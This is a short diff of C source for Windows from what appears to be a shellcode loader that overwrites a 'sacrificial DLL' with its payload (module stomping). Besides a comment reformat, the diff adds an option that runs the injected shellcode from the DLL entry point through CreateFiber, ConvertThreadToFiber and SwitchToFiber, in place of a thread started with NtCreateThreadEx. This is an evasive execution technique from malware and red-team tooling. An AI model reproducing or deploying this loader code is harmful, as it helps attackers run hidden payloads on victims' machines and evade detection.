@@ -30,12 +30,11 @@ BOOL InitAPIs() {
 }
 
 
-/*---------------------------------
-  Map the sacrificial DLL in the 
-  current process and verify that
-  the .text section is big enough
+/*------------------------------------------------
+  Map the sacrificial DLL in the current process 
+  and verify that the .text section is big enough
   for the shellcode
----------------------------------*/
+------------------------------------------------*/
 BOOL MapAndCheckDLL(HMODULE* hModule, PULONG_PTR dllEntry, SIZE_T scSize) {
 
 	if (!NtAPIs.IsInitialized) {
@@ -175,6 +174,26 @@ BOOL WriteExec(ULONG_PTR dllEntry, PCONTENT cnt) {
 		return FALSE;
 	}
 
+#ifdef FIBER_EXEC
+	DEBUG_PRINT("[*] Creating fiber for execution\n");
+	PVOID fiberAddr = CreateFiber(0x00, (LPFIBER_START_ROUTINE)dllEntry, NULL);
+	if (!fiberAddr) {
+		DEBUG_PRINT("[!] Failed creating fiber: %d\n", GetLastError());
+		return FALSE;
+	}
+
+	DEBUG_PRINT("\t> Converting the main thread to fiber");
+	PVOID pFiberAddr = ConvertThreadToFiber(NULL);
+	if (!pFiberAddr) {
+		DEBUG_PRINT("[!] Converting the main thread failed: %d\n", GetLastError());
+		return FALSE;
+	}
+
+	DEBUG_PRINT("\t> Scheduling the fiber execution\n");
+	SwitchToFiber(fiberAddr);
+	return TRUE;
+
+#elif !defined(FIBER_EXEC)
 	DEBUG_PRINT("[*] Creating an execution thread from: 0x%p\n", dllEntry);
 	status = NtAPIs.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, dllEntry, NULL, FALSE, 0x00, 0x00, 0x00, NULL);
 	if (status != 0x00) {
@@ -184,6 +203,7 @@ BOOL WriteExec(ULONG_PTR dllEntry, PCONTENT cnt) {
 
 	NtAPIs.pNtWaitForSingleObject(hThread, FALSE, NULL);
 	return TRUE;
+#endif
 }
 
 
